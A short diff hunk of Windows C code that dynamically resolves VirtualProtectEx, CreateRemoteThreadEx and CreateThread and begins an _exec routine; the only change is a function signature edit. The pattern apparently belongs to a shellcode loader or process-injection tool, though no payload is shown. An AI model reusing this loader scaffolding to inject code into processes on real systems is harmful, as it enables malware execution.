@@ -116,7 +116,7 @@ pfnVirtualProtectEx     pVirtualProtectEx           =     (pfnVirtualProtectEx)G
 pfnCreateRemoteThreadEx pCreateRemoteThreadEx       =     (pfnCreateRemoteThreadEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateRemoteThreadEx");
 pfnCreateThread         pCreateThread               =     (pfnCreateThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateThread");
 // ------------------------------------------------------------------------------------------------------------
-void _exec(void) {
+void _exec() {
 
     DWORD oldProtect = NULL;
     HANDLE cThread = NULL;
